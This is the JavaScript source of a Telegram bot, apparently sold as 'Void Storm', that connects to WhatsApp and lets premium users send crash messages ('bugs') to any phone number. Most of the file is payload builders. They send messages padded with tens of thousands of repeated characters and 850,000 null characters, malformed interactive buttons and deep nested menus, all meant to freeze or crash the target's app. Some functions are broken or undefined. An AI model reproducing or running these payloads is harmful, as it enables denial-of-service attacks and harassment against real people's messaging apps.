const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Zeph = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/z97c0j.jpg",
    "https://files.catbox.moe/c0bo23.jpg",
    "https://files.catbox.moe/l1n2lq.jpg",
    "https://files.catbox.moe/jjx2ls.jpg",
    "https://files.catbox.moe/tchk6t.jpg",
    "https://files.catbox.moe/ld5bu1.jpg",
    "https://files.catbox.moe/y0t8o1.jpg",
    "https://files.catbox.moe/7t26xv.jpg",
    "https://files.catbox.moe/l87ffw.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    Zeph = makeWASocket(connectionOptions);
    if (usePairingCode && !Zeph.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.yellow(`\nMasukan nomor sender!\n\nGunakan WhatsApp Messenger\nJangan menggunakan WhatsApp Bussines\n`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await Zeph.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.bold.white(`KODE PAIRING ANDA `), chalk.bold.yellow(formattedCode));
    }

    Zeph.ev.on('creds.update', saveCreds);
    store.bind(Zeph.ev);

    Zeph.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.bold.white('Connected!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }

    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `
╔─═⊱    𝐕𝚯𝐈𝐃 𝐒𝐓𝐎𝐑𝐌 = AMPAS  ─═⬡
║ 𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : [𝗭𝗲𝗽𝗵𝘆𝗿𝗶𝗻𝗲](𝘁𝗴://𝘂𝘀𝗲𝗿?𝗶𝗱=𝟳𝟯𝟬𝟴𝟴𝟭𝟮𝟴𝟴𝟵)
│ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 𝟴.𝟬
║ 𝗢𝘀 : 𝗟𝗶𝗻𝘂𝘅
│ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺
║ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : *${waktuRunPanel}*
┗━━━━━━━━━━━━━━━⬡
╔─═ Storm Fatality
║/payload 628xxx
│/invcop 628xxx
║/trashui 628xxx
│/invispc 628xxx
┗━━━━━━━━━━━━━━━⬡
╔─═──═──═───═──═⬡
║/addreseller
│/addtoken
║/addprem
│/delprem
║/cekprem
║/restart
┗━━━━━━━━━━━━━━━⬡
╔─═ 𝗧𝗵𝗮𝗻𝗸𝘀𝗧𝗼 🎏
║友 𝗗𝗲𝘃𝗼𝗿𝘀𝗶𝘅𝗰𝗼𝗿𝗲
│友 𝗗𝗮𝗻𝗶𝗲𝗹 / 𝘃𝗲𝗿𝟲𝗰𝗼𝗿𝗲
║友 𝗔𝗻𝗼𝘀
│友 𝗫𝗮𝘁𝗮𝗻𝗶𝗰𝗮𝗹
┗━━━━━━━━━━━━━━━⬡`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url('DEVELOPER', 'https://t.me/rainoneday')]
        ])
    });
});

bot.command("payload", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 2; i++) {
        await CrashCursor(bijipler);
        await Payload(bijipler);
        await Payload(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by zephyrine`
    );
});

bot.command("trashui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 2; i++) {
        await CrashCursor(bijipler);
        await Zetx(bijipler);
        await Zetx(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ZullCrazher`
    );
});

bot.command("invcop", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 8; i++) {
        await CrashCursor(bijipler);
        await invc(bijipler);
        await invc(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await invc(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ZullCrazher`
    );
});

bot.command("invispc", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 5; i++) {
        await CrashCursor(bijipler);
        await invc(bijipler);
        await invc(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
        await CrashCursor(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by ZullCrazher`
    );
});


// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

bot.command('addreseller', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan ID reseller setelah perintah. Contoh: /addreseller 12345");
    }

    const resellerId = args[1];
    if (resellers.includes(resellerId)) {
        return ctx.reply(`❌ Reseller dengan ID ${resellerId} sudah terdaftar.`);
    }

    const success = await addReseller(resellerId);

    if (success) {
        return ctx.reply(`✅ Reseller dengan ID ${resellerId} berhasil ditambahkan.`);
    } else {
        return ctx.reply(`❌ Gagal menambahkan reseller dengan ID ${resellerId}.`);
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});

async function Payload(bijipler) {
      let sections = [];

      for (let i = 0; i < 1; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [bijipler],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: bijipler,
                },
              },
              body: {
                text: " 𝐙𝚵𝐏𝐇𝐇𝐘𝐑𝐢𝐍Σ ラ‣  ",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await Zeph.relayMessage(bijipler, message, {
        participant: { jid: bijipler },
      });
    }
 
async function CrashCursor(bijipler) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "⃨⃰𝐕𝚯𝐈𝐃 𝐒𝐓𝐑𝐈𝐊𝐄͢   " + "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "SSS+",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [bijipler],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  contactVcard: true,
                },
                contentText: "p",
                footerText: "p",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "Zeph -      ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            actionLink: {
              url: "t.me/rainoneday",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: bijipler,
              initiatedByMe: true,
            },
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              ctaPayload: "cta",
              disableNudge: true,
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "123132123123123@newsletter",
              serverMessageId: 1,
              newsletterName: "P",
              contentType: 3,
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
        },
      },
    },
  };

  await Zeph.relayMessage(bijipler, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: bijipler },
  });
}
 
async function ZetX(bijipler) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [bijipler],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: bijipler,
            },
          },
          body: {
            text: "Masive Flood",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "𝗭𝗲𝗽𝗵𝘆𝗿𝗶𝗻𝗲",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "𝗭𝗲𝗽𝗵𝘆𝗿𝗶𝗻𝗲",
              },
              {
                name: "mpm",
                buttonParamsJson: "𝗭𝗲𝗽𝗵𝘆𝗿𝗶𝗻𝗲",
              },
            ],
          },
        },
      },
    },
  };
  

  await Zeph.relayMessage(bijipler, message, {
    participant: { jid: bijipler },
  });
}
  
  async function invc(nomor) {
     let bijipler = nomor 
     let msg = await generateWAMessageFromContent(bijipler, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "dvx",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "dvx"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
      }
 
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red("\nVOID STORM UNITY"));
    console.log(chalk.bold.white("DEVELOPER: ZEPHYRINE HIYASHI"));
    console.log(chalk.bold.white("VERSION: 8.0"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER/DEVELOPER"));
})();